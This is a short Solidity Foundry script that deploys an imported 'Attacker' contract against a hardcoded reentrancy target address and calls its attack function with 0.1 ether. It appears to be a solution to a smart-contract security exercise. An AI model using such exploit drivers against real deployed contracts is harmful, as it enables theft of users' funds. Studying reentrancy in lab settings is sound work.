// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Attacker} from "../src/Reentrancy.sol";

contract DeployReentrancyAttack is Script {
    address public constant REENTRANCE_ADDRESS =
        0x79F6562E605cDC40974d6675aa44DE518fA95359;

    function run() external {
        vm.startBroadcast();
        Attacker attacker = new Attacker(REENTRANCE_ADDRESS);
        console.log(address(this));
        attacker.attack{value: 0.1 ether}();
        vm.stopBroadcast();
    }
}
